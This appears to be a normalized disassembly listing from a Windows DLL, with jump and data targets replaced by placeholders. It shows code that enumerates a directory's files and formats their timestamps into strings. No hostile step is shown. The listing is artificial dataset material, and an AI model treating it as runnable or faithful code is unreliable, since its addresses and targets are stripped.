cmp [ ebp - 0x130 ] edi
jae r-xdata
mov eax [ ebp - 0x3c8 ]
push eax
call sub_10019ce4
add esp 0x4
lea edx [ ebp - 0x68c ]
push edx
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x6a0 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x144 ]
cmp [ ebp + 0x40 ] bl
jne r-xdata
jmp r-xdata
push r--data
lea ecx [ ebp - 0x9c ]
call sub_10003ae0
push eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x80 ]
push ecx
mov [ ebp - 0x4 ] 0x4e
call sub_10007d90
add esp 0xc
push eax
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x4 ] 0x4f
call sub_10003860
cmp [ ebp - 0x6c ] edi
jb r-xdata
cmp [ ebp - 0x130 ] edi
jb r-xdata
lea eax [ ebp - 0x410 ]
push eax
lea ecx [ ebp - 0x680 ]
push ecx
call [ FileTimeToSystemTime@IAT ]
lea edx [ ebp - 0x43c ]
push edx
lea eax [ ebp - 0x410 ]
push eax
push ebx
call [ SystemTimeToTzSpecificLocalTime@IAT ]
test [ ebp - 0x68c ] 0x10
jne r-xdata
xor eax eax
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] ax
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] ax
cmp [ ebp - 0x1d8 ] edi
jb r-xdata
mov edx [ ebp - 0x144 ]
push edx
call sub_10019ce4
add esp 0x4
cmp [ ebp + 0x40 ] bl
jne r-xdata
xor ecx ecx
push 0x1
mov [ ebp - 0x17c ] cx
push r--data
lea ecx [ ebp - 0x17c ]
mov [ ebp - 0x168 ] esi
mov [ ebp - 0x16c ] ebx
call sub_100034e0
xor edx edx
lea eax [ ebp - 0x660 ]
mov [ ebp - 0x4 ] 0xc
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
lea ecx [ eax + 0x2 ]
mov eax [ ebp - 0x144 ]
cmp [ ebp - 0x130 ] edi
jae r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x1d8 ] esi
mov [ ebp - 0x1dc ] ebx
mov [ ebp - 0x1ec ] dx
cmp [ ebp - 0x14c ] edi
jb r-xdata
mov ecx [ ebp - 0x1ec ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x6a0 ]
lea edx [ ebp - 0x68c ]
push edx
push eax
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x17c ] ax
lea eax [ ebp - 0x660 ]
mov [ ebp - 0x168 ] esi
mov [ ebp - 0x16c ] ebx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
lea eax [ ebp - 0x660 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_100034e0
xor ecx ecx
push 0x1
mov [ ebp - 0x64 ] cx
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xd
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
call sub_100034e0
movzx edx [ ebp - 0x432 ]
mov [ ebp - 0x694 ] edx
sub esp 0x8
lea eax [ ebp - 0x80 ]
fild [ ebp - 0x694 ]
mov [ ebp - 0x4 ] 0xe
fstp [ esp ]
push eax
call sub_10013690
add esp 0xc
mov edi eax
xor ecx ecx
push 0x1
mov [ ebp - 0x10c ] cx
push r--data
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
call sub_100034e0
movzx edx [ ebp - 0x434 ]
mov [ ebp - 0x694 ] edx
sub esp 0x8
lea eax [ ebp - 0x9c ]
fild [ ebp - 0x694 ]
mov [ ebp - 0x4 ] 0x10
fstp [ esp ]
push eax
call sub_10013690
add esp 0xc
mov [ ebp - 0x690 ] eax
xor ecx ecx
push 0x1
mov [ ebp - 0xf0 ] cx
push r--data
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0x11
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
call sub_100034e0
movzx edx [ ebp - 0x43c ]
mov [ ebp - 0x694 ] edx
sub esp 0x8
lea eax [ ebp - 0xb8 ]
fild [ ebp - 0x694 ]
mov [ ebp - 0x4 ] 0x12
fstp [ esp ]
push eax
call sub_10013690
add esp 0xc
mov [ ebp - 0x6a4 ] eax
xor ecx ecx
push 0x1
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] cx
push r--data
lea ecx [ ebp - 0x128 ]
call sub_100034e0
movzx edx [ ebp - 0x43a ]
mov [ ebp - 0x694 ] edx
sub esp 0x8
lea eax [ ebp - 0xd4 ]
fild [ ebp - 0x694 ]
mov [ ebp - 0x4 ] 0x14
fstp [ esp ]
push eax
call sub_10013690
add esp 0xc
mov [ ebp - 0x69c ] eax
xor ecx ecx
push 0x1
mov [ ebp - 0x3e4 ] cx
push r--data
lea ecx [ ebp - 0x3e4 ]
mov [ ebp - 0x4 ] 0x15
mov [ ebp - 0x3d0 ] esi
mov [ ebp - 0x3d4 ] ebx
call sub_100034e0
movzx edx [ ebp - 0x436 ]
mov [ ebp - 0x694 ] edx
sub esp 0x8
lea eax [ ebp - 0x390 ]
fild [ ebp - 0x694 ]
mov [ ebp - 0x4 ] 0x16
fstp [ esp ]
push eax
call sub_10013690
mov [ ebp - 0x694 ] eax
mov ecx [ ebp - 0x66c ]
push ebx
push ecx
lea edx [ ebp - 0x240 ]
push edx
mov [ ebp - 0x4 ] 0x17
call sub_10013600
push eax
lea eax [ ebp - 0x2e8 ]
push eax
lea ecx [ ebp - 0x3ac ]
push ecx
mov [ ebp - 0x4 ] 0x18
call sub_10007d90
lea edx [ ebp - 0x160 ]
push edx
push eax
lea eax [ ebp - 0x374 ]
push eax
mov [ ebp - 0x4 ] 0x19
call sub_10007de0
mov ecx [ ebp - 0x694 ]
push ecx
push eax
lea edx [ ebp - 0x33c ]
push edx
mov [ ebp - 0x4 ] 0x1a
call sub_10013a70
lea ecx [ ebp - 0x3e4 ]
push ecx
push eax
lea edx [ ebp - 0x304 ]
push edx
mov [ ebp - 0x4 ] 0x1b
call sub_10013a70
add esp 0x48
mov ecx [ ebp - 0x69c ]
push ecx
mov [ ebp - 0x4 ] 0x1c
push eax
lea edx [ ebp - 0x2cc ]
push edx
call sub_10013a70
lea ecx [ ebp - 0x128 ]
push ecx
push eax
lea edx [ ebp - 0x294 ]
push edx
mov [ ebp - 0x4 ] 0x1d
call sub_10013a70
mov ecx [ ebp - 0x6a4 ]
push ecx
push eax
lea edx [ ebp - 0x25c ]
push edx
mov [ ebp - 0x4 ] 0x1e
call sub_10013a70
lea ecx [ ebp - 0xf0 ]
push ecx
push eax
lea edx [ ebp - 0x224 ]
push edx
mov [ ebp - 0x4 ] 0x1f
call sub_10013a70
mov ecx [ ebp - 0x690 ]
push ecx
push eax
lea edx [ ebp - 0x208 ]
push edx
mov [ ebp - 0x4 ] 0x20
call sub_10013a70
lea ecx [ ebp - 0x10c ]
push ecx
push eax
lea edx [ ebp - 0x1d0 ]
push edx
mov [ ebp - 0x4 ] 0x21
call sub_10013a70
add esp 0x48
push edi
push eax
lea eax [ ebp - 0x1b4 ]
push eax
mov [ ebp - 0x4 ] 0x22
call sub_10013a70
lea ecx [ ebp - 0x160 ]
push ecx
push eax
lea edx [ ebp - 0x2b0 ]
push edx
mov [ ebp - 0x4 ] 0x23
call sub_10007de0
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x24
call sub_10007de0
lea ecx [ ebp - 0x64 ]
push ecx
push eax
lea edx [ ebp - 0x320 ]
push edx
mov [ ebp - 0x4 ] 0x25
call sub_10013a70
lea ecx [ ebp - 0x48 ]
push ecx
mov [ ebp - 0x4 ] 0x26
push eax
lea edx [ ebp - 0x278 ]
push edx
call sub_10013a70
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x358 ]
push edx
mov [ ebp - 0x4 ] 0x27
call sub_10007de0
add esp 0x48
lea ecx [ ebp - 0x17c ]
push ecx
push eax
lea edx [ ebp - 0x400 ]
push edx
mov [ ebp - 0x4 ] 0x28
call sub_10013a70
add esp 0xc
mov edi eax
lea eax [ ebp - 0x2c ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x68c ]
push edx
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x6a0 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x144 ]
xor ecx ecx
mov [ ebp - 0x14c ] esi
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x160 ] cx
cmp [ ebp - 0x2d4 ] edi
jb r-xdata
mov eax [ ebp - 0x160 ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x6a0 ]
push ecx
call [ FindClose@IAT ]
mov edi 0x8
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
lea ecx [ ebp - 0x660 ]
push ecx
lea ecx [ ebp - 0x17c ]
call sub_100034e0
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x32
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] dx
call sub_100034e0
movzx eax [ ebp - 0x432 ]
mov [ ebp - 0x690 ] eax
sub esp 0x8
lea ecx [ ebp - 0x358 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x33
fstp [ esp ]
push ecx
call sub_10013690
add esp 0xc
mov edi eax
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0x34
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] dx
call sub_100034e0
movzx eax [ ebp - 0x434 ]
mov [ ebp - 0x690 ] eax
sub esp 0x8
lea ecx [ ebp - 0x278 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x35
fstp [ esp ]
push ecx
call sub_10013690
add esp 0xc
mov [ ebp - 0x694 ] eax
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x36
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] dx
call sub_100034e0
movzx eax [ ebp - 0x43c ]
mov [ ebp - 0x690 ] eax
sub esp 0x8
lea ecx [ ebp - 0x320 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x37
fstp [ esp ]
push ecx
call sub_10013690
add esp 0xc
mov [ ebp - 0x69c ] eax
xor edx edx
push 0x1
mov [ ebp - 0x4 ] 0x38
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] dx
push r--data
lea ecx [ ebp - 0x64 ]
call sub_100034e0
movzx eax [ ebp - 0x43a ]
mov [ ebp - 0x690 ] eax
sub esp 0x8
lea ecx [ ebp - 0x198 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x39
fstp [ esp ]
push ecx
call sub_10013690
add esp 0xc
mov [ ebp - 0x6a4 ] eax
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x3a
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
call sub_100034e0
movzx eax [ ebp - 0x436 ]
mov [ ebp - 0x690 ] eax
sub esp 0x8
lea ecx [ ebp - 0x2b0 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x3b
fstp [ esp ]
push ecx
call sub_10013690
mov [ ebp - 0x690 ] eax
mov edx [ ebp - 0x66c ]
push ebx
push edx
lea eax [ ebp - 0x1b4 ]
push eax
mov [ ebp - 0x4 ] 0x3c
call sub_10013600
push eax
lea ecx [ ebp - 0x2e8 ]
push ecx
lea edx [ ebp - 0x1d0 ]
push edx
mov [ ebp - 0x4 ] 0x3d
call sub_10007d90
lea ecx [ ebp - 0x160 ]
push ecx
push eax
lea edx [ ebp - 0x208 ]
push edx
mov [ ebp - 0x4 ] 0x3e
call sub_10007de0
mov ecx [ ebp - 0x690 ]
push ecx
push eax
lea edx [ ebp - 0x224 ]
push edx
mov [ ebp - 0x4 ] 0x3f
call sub_10013a70
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea edx [ ebp - 0x25c ]
push edx
mov [ ebp - 0x4 ] 0x40
call sub_10013a70
add esp 0x48
mov ecx [ ebp - 0x6a4 ]
push ecx
mov [ ebp - 0x4 ] 0x41
push eax
lea edx [ ebp - 0x294 ]
push edx
call sub_10013a70
lea ecx [ ebp - 0x64 ]
push ecx
push eax
lea edx [ ebp - 0x2cc ]
push edx
mov [ ebp - 0x4 ] 0x42
call sub_10013a70
mov ecx [ ebp - 0x69c ]
push ecx
push eax
lea edx [ ebp - 0x304 ]
push edx
mov [ ebp - 0x4 ] 0x43
call sub_10013a70
lea ecx [ ebp - 0x10c ]
push ecx
push eax
lea edx [ ebp - 0x33c ]
push edx
mov [ ebp - 0x4 ] 0x44
call sub_10013a70
mov ecx [ ebp - 0x694 ]
push ecx
push eax
lea edx [ ebp - 0x374 ]
push edx
mov [ ebp - 0x4 ] 0x45
call sub_10013a70
lea ecx [ ebp - 0xf0 ]
push ecx
push eax
lea edx [ ebp - 0x3ac ]
push edx
mov [ ebp - 0x4 ] 0x46
call sub_10013a70
add esp 0x48
push edi
push eax
lea eax [ ebp - 0x240 ]
push eax
mov [ ebp - 0x4 ] 0x47
call sub_10013a70
lea ecx [ ebp - 0x160 ]
push ecx
push eax
lea edx [ ebp - 0x390 ]
push edx
mov [ ebp - 0x4 ] 0x48
call sub_10007de0
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0xd4 ]
push edx
mov [ ebp - 0x4 ] 0x49
call sub_10007de0
lea ecx [ ebp - 0x128 ]
push ecx
push eax
lea edx [ ebp - 0xb8 ]
push edx
mov [ ebp - 0x4 ] 0x4a
call sub_10013a70
lea ecx [ ebp - 0x17c ]
push ecx
mov [ ebp - 0x4 ] 0x4b
push eax
lea edx [ ebp - 0x9c ]
push edx
call sub_10013a70
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x4 ] 0x4c
call sub_10007de0
add esp 0x48
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4d
call sub_10003860
mov edi 0x8
cmp [ ebp - 0x6c ] edi
jb r-xdata
cmp [ ebp - 0x3ec ] 0x8
jb r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ ebp - 0x130 ] edi
jb r-xdata
nop
xor eax eax
mov [ ebp - 0x2d4 ] esi
mov [ ebp - 0x2d8 ] ebx
mov [ ebp - 0x2e8 ] ax
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov edx [ ebp - 0x2e8 ]
push edx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] cx
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0x344 ] 0x8
mov [ ebp - 0x3ec ] esi
mov [ ebp - 0x3f0 ] ebx
mov [ ebp - 0x400 ] ax
jb r-xdata
mov edx [ ebp - 0x400 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] cx
cmp [ ebp - 0x1d8 ] edi
jb r-xdata
mov eax [ ebp - 0x144 ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x6a0 ]
lea eax [ ebp - 0x68c ]
push eax
push ecx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x660 ] 0x2e
je r-xdata
xor edx edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] ax
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0x264 ] 0x8
mov [ ebp - 0x344 ] esi
mov [ ebp - 0x348 ] ebx
mov [ ebp - 0x358 ] dx
jb r-xdata
mov ecx [ ebp - 0x358 ]
push ecx
call sub_10019ce4
add esp 0x4
mov edx [ edi ]
mov [ ebp - 0x2c ] edx
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
inc eax
add eax eax
push eax
lea ecx [ ebp - 0x2c ]
push edi
push ecx
call sub_1001a060
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x1d8 ] esi
mov [ ebp - 0x1dc ] ebx
mov [ ebp - 0x1ec ] ax
cmp [ ebp - 0x14c ] edi
jb r-xdata
mov edx [ ebp - 0x1ec ]
push edx
call sub_10019ce4
add esp 0x4
test [ ebp - 0x68c ] 0x10
je r-xdata
mov edx [ ebp - 0x6a0 ]
push edx
call [ FindClose@IAT ]
lea eax [ ebp - 0x410 ]
push eax
lea ecx [ ebp - 0x680 ]
push ecx
call [ FileTimeToSystemTime@IAT ]
lea edx [ ebp - 0x43c ]
push edx
lea eax [ ebp - 0x410 ]
push eax
push ebx
call [ SystemTimeToTzSpecificLocalTime@IAT ]
lea ecx [ ebp - 0x660 ]
push ecx
lea ecx [ ebp - 0xd4 ]
call sub_10003ae0
mov edi eax
push r--data
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x50
call sub_10003ae0
push eax
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x51
call sub_10007d90
push edi
push eax
lea ecx [ ebp - 0x80 ]
push ecx
mov [ ebp - 0x4 ] 0x52
call sub_10013a70
add esp 0x18
push eax
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x4 ] 0x53
call sub_10003860
cmp [ ebp - 0x6c ] 0x8
jb r-xdata
xor ecx ecx
mov [ ebp + 0x1c ] esi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] cx
cmp [ ebp + 0x38 ] edi
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] dx
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x30c ] 0x8
mov [ ebp - 0x264 ] esi
mov [ ebp - 0x268 ] ebx
mov [ ebp - 0x278 ] cx
jb r-xdata
mov eax [ ebp - 0x278 ]
push eax
call sub_10019ce4
add esp 0x4
mov eax [ edi + 0x10 ]
mov [ ebp - 0x1c ] eax
mov ecx [ edi + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
xor edx edx
mov [ ebp - 0x14c ] esi
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x160 ] dx
cmp [ ebp - 0x2d4 ] edi
jb r-xdata
mov ecx [ ebp - 0x160 ]
push ecx
call sub_10019ce4
add esp 0x4
xor eax eax
mov edi 0x8
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] ax
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_10019ce4
add esp 0x4
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x40
mov edx [ ebp + 0x24 ]
push edx
jmp r-xdata
xor ecx ecx
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] cx
cmp [ ebp - 0x37c ] edi
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0x184 ] 0x8
mov [ ebp - 0x30c ] esi
mov [ ebp - 0x310 ] ebx
mov [ ebp - 0x320 ] ax
jb r-xdata
mov edx [ ebp - 0x320 ]
push edx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x2d4 ] esi
mov [ ebp - 0x2d8 ] ebx
mov [ ebp - 0x2e8 ] cx
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ ebp - 0x2e8 ]
push eax
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_10019ce4
add esp 0x4
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x37c ] esi
mov [ ebp - 0x380 ] ebx
mov [ ebp - 0x390 ] ax
cmp [ ebp - 0x22c ] edi
jb r-xdata
mov edx [ ebp - 0x390 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0x29c ] 0x8
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x198 ] dx
jb r-xdata
mov ecx [ ebp - 0x198 ]
push ecx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x1c ] edi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x22c ] esi
mov [ ebp - 0x230 ] ebx
mov [ ebp - 0x240 ] dx
cmp [ ebp - 0x398 ] edi
jb r-xdata
mov ecx [ ebp - 0x240 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x1a0 ] 0x8
mov [ ebp - 0x29c ] esi
mov [ ebp - 0x2a0 ] ebx
mov [ ebp - 0x2b0 ] cx
jb r-xdata
mov eax [ ebp - 0x2b0 ]
push eax
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp + 0x1c ] esi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
cmp [ ebp + 0x38 ] edi
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp + 0x34 ]
push 0x1
push r--data
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_100068a0
test eax eax
jne r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x398 ] esi
mov [ ebp - 0x39c ] ebx
mov [ ebp - 0x3ac ] cx
cmp [ ebp - 0x360 ] edi
jb r-xdata
mov eax [ ebp - 0x3ac ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0x1bc ] 0x8
mov [ ebp - 0x1a0 ] esi
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1b4 ] ax
jb r-xdata
mov edx [ ebp - 0x1b4 ]
push edx
call sub_10019ce4
add esp 0x4
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x44 ]
mov edx [ ebp + 0x40 ]
push ecx
push edx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6a8 ] esp
push 0xffffffff
push ebx
lea edx [ ebp + 0x24 ]
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_100019e0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6ac ] esp
push 0xffffffff
push ebx
lea edx [ ebp - 0x144 ]
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x70
mov [ ecx ] ax
call sub_100019e0
mov ecx [ ebp - 0x698 ]
mov [ ebp - 0x4 ] 0xb
call sub_10013f40
mov edi 0x8
lea ecx [ ebp - 0x660 ]
push ecx
lea ecx [ ebp - 0xf0 ]
call sub_10003ae0
mov edi eax
push r--data
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x54
call sub_10003ae0
mov [ ebp - 0x6a8 ] eax
movzx edx [ ebp - 0x432 ]
mov [ ebp - 0x690 ] edx
sub esp 0x8
lea eax [ ebp - 0x64 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x55
fstp [ esp ]
push eax
call sub_10013690
add esp 0xc
mov [ ebp - 0x6ac ] eax
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x56
call sub_10003ae0
mov [ ebp - 0x6b4 ] eax
movzx ecx [ ebp - 0x434 ]
mov [ ebp - 0x690 ] ecx
sub esp 0x8
lea edx [ ebp - 0x17c ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x57
fstp [ esp ]
push edx
call sub_10013690
add esp 0xc
mov [ ebp - 0x6b0 ] eax
push r--data
lea ecx [ ebp - 0x400 ]
mov [ ebp - 0x4 ] 0x58
call sub_10003ae0
mov [ ebp - 0x6bc ] eax
movzx eax [ ebp - 0x43c ]
mov [ ebp - 0x690 ] eax
sub esp 0x8
lea ecx [ ebp - 0x358 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x59
fstp [ esp ]
push ecx
call sub_10013690
add esp 0xc
mov [ ebp - 0x6b8 ] eax
push r--data
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0x5a
call sub_10003ae0
mov [ ebp - 0x694 ] eax
movzx edx [ ebp - 0x43a ]
mov [ ebp - 0x690 ] edx
sub esp 0x8
lea eax [ ebp - 0x320 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x5b
fstp [ esp ]
push eax
call sub_10013690
add esp 0xc
mov [ ebp - 0x69c ] eax
mov [ ebp - 0x4 ] 0x5c
push r--data
lea ecx [ ebp - 0x198 ]
call sub_10003ae0
mov [ ebp - 0x6a4 ] eax
movzx ecx [ ebp - 0x436 ]
mov [ ebp - 0x690 ] ecx
sub esp 0x8
lea edx [ ebp - 0x2b0 ]
fild [ ebp - 0x690 ]
mov [ ebp - 0x4 ] 0x5d
fstp [ esp ]
push edx
call sub_10013690
mov [ ebp - 0x690 ] eax
mov eax [ ebp - 0x66c ]
push ebx
push eax
lea ecx [ ebp - 0x1b4 ]
push ecx
mov [ ebp - 0x4 ] 0x5e
call sub_10013600
push eax
lea edx [ ebp - 0x2e8 ]
push edx
lea eax [ ebp - 0x1d0 ]
push eax
mov [ ebp - 0x4 ] 0x5f
call sub_10007d90
lea ecx [ ebp - 0x160 ]
push ecx
push eax
lea edx [ ebp - 0x208 ]
push edx
mov [ ebp - 0x4 ] 0x60
call sub_10007de0
mov ecx [ ebp - 0x690 ]
push ecx
push eax
lea edx [ ebp - 0x224 ]
push edx
mov [ ebp - 0x4 ] 0x61
call sub_10013a70
mov ecx [ ebp - 0x6a4 ]
push ecx
push eax
lea edx [ ebp - 0x25c ]
push edx
mov [ ebp - 0x4 ] 0x62
call sub_10013a70
add esp 0x48
mov ecx [ ebp - 0x69c ]
push ecx
push eax
lea edx [ ebp - 0x294 ]
push edx
mov [ ebp - 0x4 ] 0x63
call sub_10013a70
mov ecx [ ebp - 0x694 ]
push ecx
push eax
lea edx [ ebp - 0x2cc ]
push edx
mov [ ebp - 0x4 ] 0x64
call sub_10013a70
mov ecx [ ebp - 0x6b8 ]
push ecx
push eax
lea edx [ ebp - 0x304 ]
push edx
mov [ ebp - 0x4 ] 0x65
call sub_10013a70
mov ecx [ ebp - 0x6bc ]
mov [ ebp - 0x4 ] 0x66
push ecx
push eax
lea edx [ ebp - 0x33c ]
push edx
call sub_10013a70
mov ecx [ ebp - 0x6b0 ]
push ecx
push eax
lea edx [ ebp - 0x374 ]
push edx
mov [ ebp - 0x4 ] 0x67
call sub_10013a70
